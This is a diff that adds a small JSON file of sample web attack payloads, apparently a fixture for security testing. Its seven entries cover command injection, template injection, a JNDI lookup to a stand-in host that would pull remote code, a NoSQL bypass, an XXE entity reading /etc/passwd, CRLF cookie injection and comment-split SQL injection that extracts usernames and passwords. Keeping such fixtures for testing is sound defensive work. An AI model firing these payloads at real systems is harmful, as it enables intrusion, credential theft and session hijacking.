@@ -1,0 +1,9 @@
+{
+  "cmd": "; whoami && id",
+  "ssti": "{{7*7}}",
+  "jndi": "${jndi:ldap://evil.invalid/a}",
+  "nosql": "{\"$ne\": \"\"}",
+  "xxe": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+  "crlf": "next=%0d%0aSet-Cookie:%20session=hijacked",
+  "sqli_evasion": "UN/**/ION SEL/**/ECT username,password FROM users"
+}
